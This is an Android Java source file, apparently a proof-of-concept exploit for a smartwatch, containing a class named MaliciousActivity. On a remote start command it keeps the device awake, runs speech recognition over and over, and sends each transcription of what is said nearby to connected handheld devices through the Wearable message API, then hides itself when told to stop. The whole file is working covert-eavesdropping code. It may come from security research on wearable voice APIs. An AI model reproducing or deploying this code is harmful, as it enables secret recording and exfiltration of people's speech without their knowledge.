package com.alexey_reznik.voice_api_exploit;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.PowerManager;
import android.speech.RecognizerIntent;
import android.util.Log;

import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.common.api.PendingResult;
import com.google.android.gms.common.api.ResultCallback;
import com.google.android.gms.wearable.Node;
import com.google.android.gms.wearable.NodeApi;
import com.google.android.gms.wearable.Wearable;

import java.util.List;

public class MaliciousActivity extends Activity {
    public static final String LOG_TAG = "Exploit: MaliciousActivity";
    public static final String START_RECOGNITION = "startRegognition";
    public static final String STOP_RECOGNITION = "stopRecognition";
    public static final String END_STRING = "endOfAudio";
    private static final int SPEECH_REQUEST_CODE = 100;
    private PowerManager.WakeLock mWakeLock;
    private PowerManager powerManager;
    private boolean isLooped;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(LOG_TAG, "onCreate");
        powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        mWakeLock = powerManager.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "Malicious Activity");
        String command = getIntent().getStringExtra(ListenerService.COMMAND);
        if (command != null && !command.isEmpty()) {
            if (command.equals(START_RECOGNITION)) {
                //START_RECOGNITION command has been received
                if (mWakeLock.isHeld()) {
                    mWakeLock.release();
                }
                if (!mWakeLock.isHeld()) {
                    mWakeLock.acquire();
                }
                Log.d(LOG_TAG, "Calling Speech Recognition Activity");
                isLooped = true;
                Intent intent = new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH);
                intent.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL,
                        RecognizerIntent.LANGUAGE_MODEL_FREE_FORM);
                startActivityForResult(intent, SPEECH_REQUEST_CODE);
            } else if (command.equals(STOP_RECOGNITION)) {
                //STOP_RECOGNITION command has been received
                sendResponse(END_STRING);
                isLooped = false;
                moveTaskToBack(true);
            }
        } else {
            moveTaskToBack(true);
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        Log.d(LOG_TAG, "onNewIntent");
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode,
                                    Intent data) {
        Log.d(LOG_TAG, "onActivityResult");
        if (requestCode == SPEECH_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                List<String> results = data.getStringArrayListExtra(
                        RecognizerIntent.EXTRA_RESULTS);
                String spokenText = results.get(0);
                if ((spokenText != null) && (!spokenText.isEmpty())) {
                    sendResponse(spokenText);
                }
            }
            if (mWakeLock.isHeld()) {
                mWakeLock.release();
            }
            if (!mWakeLock.isHeld()) {
                mWakeLock.acquire();
            }
            if (isLooped) {
                Log.d(LOG_TAG, "Calling Speech Recognition Activity");
                Intent intent = new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH);
                intent.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL,
                        RecognizerIntent.LANGUAGE_MODEL_FREE_FORM);
                startActivityForResult(intent, SPEECH_REQUEST_CODE);
            }
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

    private void sendResponse(final String text) {
        final GoogleApiClient googleApiClient = new GoogleApiClient.Builder(this)
                .addApi(Wearable.API)
                .build();

        googleApiClient.connect();

        PendingResult<NodeApi.GetConnectedNodesResult> nodes =
                Wearable.NodeApi.getConnectedNodes(googleApiClient);
        nodes.setResultCallback(new ResultCallback<NodeApi.GetConnectedNodesResult>() {
            @Override
            public void onResult(NodeApi.GetConnectedNodesResult result) {
                for (int i = 0; i < result.getNodes().size(); i++) {
                    Node node = result.getNodes().get(i);
                    String nName = node.getDisplayName();
                    String nId = node.getId();
                    Log.d(LOG_TAG, "Sending message to handheld: " + text);
                    Wearable.MessageApi.sendMessage(googleApiClient, node.getId(),
                            "com.example.voice_recognition_exploit.MyActivity", text.getBytes());
                }
            }
        });

    }
}
